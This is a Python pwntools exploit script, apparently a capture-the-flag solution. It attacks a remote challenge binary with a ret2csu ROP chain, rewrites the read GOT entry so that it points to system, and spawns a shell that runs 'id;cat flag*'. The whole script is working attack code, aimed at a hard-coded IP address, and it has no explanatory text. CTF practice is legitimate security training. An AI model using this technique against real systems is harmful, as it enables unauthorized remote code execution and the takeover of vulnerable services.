#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'error'

exe = ELF('./chall2')
rop = ROP(exe)

host, port = "3.99.48.161", "9004"

p = remote(host,port)

buff = exe.bss(0xa00)			# a buffer on bss+0xa00 around

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
gadget_add = 0x0000000000401128 # add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
set_csu = next(exe.search(asm('pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret'), executable = True))
gadget_ret = rop.find_gadget(['ret'])[0]                # for alignement purpose
call_csu = next(exe.search(asm('mov rdx, r14; mov rsi, r13; mov edi, r12d')))


def add_gadget(gadget_csu, gadget_add, address, val):
  return p64(gadget_csu)+p64(val & 0xffffffff)+p64(address+0x3d)+p64(0)*4+p64(gadget_add)

def do_ret2csu(edi=0,rsi=0,rdx=0, func=0, rbx=0,rbp=0,r12=0,r13=0,r14=0,r15=0):
   global set_csu
   global call_csu
   return p64(set_csu)+p64(0)+p64(1)+p64(edi)+p64(rsi)+p64(rdx)+p64(func)+p64(call_csu)+p64(0)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)


offset = 0xfff442e0  # offset from read to system function in remote libc (found by secret black magic)
payload = 'A'*0x20+p64(0xdeadbeef)
payload += do_ret2csu(0,buff,8, exe.got['read'])
payload += add_gadget(set_csu, gadget_add, exe.got['read'], offset) + p64(pop_rdi) + p64(buff) + p64(exe.sym['read'])
payload = payload.ljust(0x200,'\x00')
p.send(payload)


p.sendline('/bin/sh\x00')

p.sendline('id;cat flag*')
p.interactive()

